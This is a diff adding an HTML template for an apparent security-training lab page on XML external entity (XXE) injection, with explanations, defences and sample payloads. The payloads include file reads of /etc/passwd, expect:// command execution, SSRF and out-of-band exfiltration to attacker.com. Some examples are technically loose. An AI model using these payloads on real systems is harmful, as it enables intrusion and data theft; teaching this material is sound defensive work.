@@ -1,0 +1,437 @@
+{% extends 'base.html' %}
+
+{% block content %}
+<style>
+    body, h1, h2, h3, h4, h5, h6, p, ul, li, a, div, img {
+        margin: 0;
+        padding: 0;
+        border: 0;
+        outline: 0;
+        font-size: 100%;
+        font-family: inherit;
+        vertical-align: baseline;
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #11111;
+        color: #333;
+    }
+    
+    .header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 10px 20px;
+        background-color: #007BFF;
+        color: #fff;
+        background: linear-gradient(to bottom, #007BFF, #0055FF);
+        box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1)
+    }
+
+    .header-left {
+        display: flex;
+        align-items: center;
+    }
+
+    .header-logo {
+        max-width: 50px;
+        margin-right: 10px;
+    }
+
+    .header-title {
+        font-size: 32px;
+        letter-spacing: 1px;
+    }
+
+    .menu {
+        display: flex;
+        align-items: center;
+        list-style-type: none;
+        padding: 0;
+    }
+
+    .menu-item {
+        display: inline-block;
+        margin-right: 25px;
+    }
+
+    .menu-item a,
+.learn-more-button {
+    text-decoration: none;
+}
+
+    .menu-item a {
+        color: #fff;
+        font-weight: bold;
+        transition: color 0.3s;
+    }
+
+    .menu-item a:hover {
+        color: #ffc107;
+        transform: translateY(-3px);    }
+
+   
+    
+    .menu-item a.active {
+        color: #ffc107;
+        font-weight: bold;
+    }
+    
+
+    .submenu {
+        display: none;
+        position: absolute;
+        background-color: #fff;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        border-radius: 5px;
+        padding: 10px;
+        z-index: 1;
+        text-align: center; /* Center the content horizontally */
+        background-color: #f0f0f0; /* Change the background color to gray */
+
+    }
+    
+    .menu-item:hover .submenu {
+        display: block;
+    }
+    
+    .submenu a {
+        display: block;
+        padding: 5px 0;
+        color: #333;
+        transition: color 0.3s;
+        text-decoration: none;
+    }
+    
+    .submenu a:hover {
+        color: #007BFF;
+        transform: translateY(-3px);
+
+    }
+    
+    .footer {
+        background-color: #333;
+        color: #fff;
+        padding: 20px 0;
+        text-align: center;
+      }
+      
+      .footer-links a {
+        color: #fff;
+        margin: 0 10px;
+        text-decoration: none;
+      }
+      
+      .footer-project-name {
+        font-size: 18px;
+        margin-top: 10px;
+
+}
+
+
+
+
+
+.title-container {
+    text-align: center;
+    padding: 30px 0;
+}
+
+.title {
+    font-size: 40px;
+    letter-spacing: 1px;
+    margin: 0;
+    color: #007BF11;
+    font-weight: bold;
+
+
+}
+
+.security-issue {
+    background-color: #f5f5f5;
+    border-radius: 5px;
+    overflow: hidden;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    margin: 40px auto;
+    max-width: 1000px;
+}
+
+.issue-image {
+    text-align: center;
+    padding: 30px;
+}
+
+.issue-image img {
+    max-width: 80%;
+    height: auto;
+    border-radius: 10px;
+}
+
+.issue-text {
+    padding: 30px;
+    font-size: 16px;
+    line-height: 1.6;
+    text-align: justify;
+}
+
+
+.learn-more-button {
+    display: inline-block;
+    background-color: #007BFF;
+    color: #fff;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight: bold;
+    transition: background-color 0.3s, color 0.3s;
+    margin-top: 20px;
+    text-decoration: none;
+}
+
+.learn-more-button:hover {
+    background-color: #0055FF;
+}
+
+.code-block {
+    background-color: #f7f7f7;
+    padding: 10px;
+    border-radius: 5px;
+    margin: 15px 0;
+    white-space: pre-wrap;
+    font-family: monospace;
+    font-size: 14px;
+    line-height: 1.5;
+}
+
+</style>
+
+<div class="security-issue">
+
+<div class="title-container">
+    <h1 class="title">XML external entity (XXE) injection</h1>
+</div>
+
+        <div class="issue-image">
+        <img src="/media/xxe.jpg" alt="xxe">
+        <p>Picture 8: picture from cobalt.io </p>
+    </div>
+
+<div class="security-issue">
+    <div class="issue-text">
+        <h3>What is an XXE Attack??</h3>
+        <p>
+            An XXE attack targets applications that parse XML input. 
+            It exploits the way XML processors handle predefined entities, making the application process unintended types of data. 
+            Think of it as someone tricking the application into reading a book it wasn't supposed to</p><br>
+     
+        
+             <p><strong>The Dangers of XXE Attacks:</strong></p>
+            
+                         
+             <p> 1. Data Disclosure: Accessing confidential files like passwords or user data</p>  
+             <p> 2. Server Side Request Forgery (SSRF): Making the server request data from other internal systems.</p>
+             <p> 3. Denial of Service (DoS): By referencing a resource that doesn't stop sending data, the application can be made unresponsive..</p>
+             <p> 4. Remote Code Execution: If conditions are right, an attacker might even execute arbitrary code on the server.</p>
+             <p> 5. Data Exfiltration: Even if the data isn't directly returned to the attacker, they can still extract it using techniques like DNS exfiltration.</p><br>
+
+             <p><strong> Examples of XXE Attacks:</strong></p>
+             
+             <div class="code-block">
+                <h4>Example 1: Accessing a Local Resource</h4>
+                <pre><code>
+                ```xml
+                &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+                &lt;!DOCTYPE foo [
+                   &lt;!ELEMENT foo ANY &gt;
+                   &lt;!ENTITY xxe SYSTEM  "file:///dev/random" &gt;]&gt;
+                &lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+                ```
+                This can make the application read a system file it wasn't supposed to.
+                </code></pre>
+            </div>
+
+             
+            <div class="code-block">
+               <h4>Example 2: Remote Code Execution</h4>
+               <pre><code>
+                ```xml
+                &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+                &lt;!DOCTYPE foo
+                 [&lt;!ELEMENT foo ANY &gt;
+                  &lt;!ENTITY xxe SYSTEM "expect://id" &gt;]&gt;
+                &lt;creds&gt;
+                  &lt;user&gt;`&amp;xxe;`&lt;/user&gt;
+                  &lt;pass&gt;`mypass`&lt;/pass&gt;
+                &lt;/creds&gt;
+                ```
+                Under specific conditions, this can run the "id" command on the server.
+                </code></pre>
+            </div>
+
+            <div class="code-block">
+                <h4>Example 3: Disclosing Sensitive Files</h4>
+                <pre><code>
+                ```xml
+                &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+                &lt;!DOCTYPE foo [
+                  &lt;!ELEMENT foo ANY &gt;
+                  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
+                &lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+                ```
+                This example tries to read the Linux password file.
+                </code></pre>
+            </div>
+            
+ 
+             
+
+        <p><strong>Protection Against XXE Attacks:</strong></p>
+
+<p>1. Disable external entities in the XML parser configuration.</P>
+    <p>2. Update XML processors and libraries regularly.</P>
+        <p>3. Use less complex data formats such as JSON where possible.</P>
+            <p>4. Implement strong input validation and avoid serialization of sensitive data.</P>
+                <p>5. Employ Web Application Firewalls (WAFs) to detect and block XXE attacks.</P><br>
+
+<p><strong>Always be vigilant and ensure that XML inputs are processed securely to keep systems and data safe.</strong></P><br>
+
+    <p><strong>Here are some examples of XXE attacks:</strong></P><br>
+
+        <p><strong>1. Basic XXE Attack:</strong></p>
+            <p>This attack attempts to read a local file from the server.</P>
+
+<div class="code-block">
+    <h4>Basic XXE Attack</h4>
+    <pre><code>
+    ```xml
+    &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+    &lt;!DOCTYPE foo [
+      &lt;!ELEMENT foo ANY &gt;
+      &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
+    &lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+    ```
+    </code></pre>
+</div>
+
+<p>If successful, this would return the contents of the `/etc/passwd` file, which contains user information on UNIX systems.</P><br>
+
+   <p><strong>2. Blind XXE Attack using Out-of-Band (OOB) Technique:</strong></P>
+
+    <p>Here, the attacker tries to exfiltrate data to an external domain they control.</P>
+   <div class="code-block">
+    <h4>Blind XXE Attack using Out-of-Band (OOB) Technique</h4>
+    <pre><code>
+    ```xml
+    &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+    &lt;!DOCTYPE foo [
+      &lt;!ELEMENT foo ANY &gt;
+      &lt;!ENTITY xxe SYSTEM "http://attacker.com/capture?data=file:///etc/passwd" &gt;]&gt;
+    &lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+    ```
+    </code></pre>
+</div>
+
+<p> The idea is to send sensitive data to the attacker’s server by embedding it as a parameter in the URL.</P><br>
+
+   <p><strong>3. Exploiting XXE to Perform SSRF:</strong></P>
+   <p>This can force the vulnerable server to make requests on behalf of the attacker.</P>
+   <div class="code-block">
+    <h4>Exploiting XXE to Perform SSRF</h4>
+    <pre><code>
+    ```xml
+    &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+    &lt;!DOCTYPE foo [
+      &lt;!ELEMENT foo ANY &gt;
+      &lt;!ENTITY xxe SYSTEM "http://internal-service/" &gt;]&gt;
+    &lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+    ```
+    </code></pre>
+</div>
+
+<p> If the application is vulnerable, it might be forced to send a request to the internal service,
+    potentially exposing internal systems or services.</P><br>
+
+    <p><strong>4. XXE with Recursive Entity Expansion (Billion Laughs Attack):</strong></P>
+        <p> This attack aims to exhaust server resources, leading to a Denial of Service (DoS).</P>
+   <div class="code-block">
+    <h4>XXE with Recursive Entity Expansion</h4>
+    <pre><code>
+    ```xml
+    &lt;?xml version="1.0"?&gt;
+    &lt;!DOCTYPE lolz [
+      &lt;!ENTITY lol "lol"&gt;
+      &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+      &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
+      ...
+    ]&gt;
+    &lt;attack&gt;&amp;lol3;&lt;/attack&gt;
+    ```
+    </code></pre>
+</div>
+
+
+<p><strong>5. XXE with Parameter Entities:</strong></P>
+    <p>  This is a more complex example where parameter entities are used to capture the contents of a file.</P>
+   <div class="code-block">
+    <h4>XXE with Parameter Entities</h4>
+    <pre><code>
+    ```xml
+    &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+    &lt;!DOCTYPE foo [
+      &lt;!ELEMENT foo ANY &gt;
+      &lt;!ENTITY % xxe SYSTEM "file:///etc/passwd" &gt;
+      &lt;!ENTITY % eval "&lt;!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%xxe;'&gt;"&gt;
+    %eval;
+    %exfiltrate;
+    ]&gt;
+    &lt;foo&gt;&lt;/foo&gt;
+    ```
+    </code></pre>
+</div>
+
+
+<p><strong>6. XXE using FTP:</strong></P>
+    <p> This is an example where FTP is used as a protocol to read a file.</P>
+   <div class="code-block">
+    <h4> Attacker Controlled FTP</h4>
+    <pre><code>
+    ```xml
+    &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+    &lt;!DOCTYPE foo [
+      &lt;!ELEMENT foo ANY &gt;
+      &lt;!ENTITY xxe SYSTEM "ftp://user:password@attacker.com/etc/passwd" &gt;]&gt;
+    &lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+    ```
+    This example attempts to access sensitive files on the attacker-controlled FTP server.
+    </code></pre>
+</div>
+
+
+<p><strong>Remember:</strong> these examples are for educational purposes, and executing these on systems without 
+    permission is illegal. Always ensure you have appropriate permissions when testing vulnerabilities.</p><br>
+
+                    
+
+
+                               
+          <h4>References:</h4>
+
+          <ul class="reference-list">
+              <li><a href="​​https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing" target="_blank">​​https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li>
+              <li><a href="https://www.cobalt.io/blog/how-to-execute-an-xml-external-entity-injection-xxe" target="_blank">https://www.cobalt.io/blog/how-to-execute-an-xml-external-entity-injection-xxe</a></li>
+              </a></li>
+  
+          </ul>
+      </div>
+
+    <a href="{% url 'lab_environment:all_labs' %}" class="learn-more-button">Go to Challenges</a>
+    </div>
+
+</div>
+
+
+
+{% endblock %}
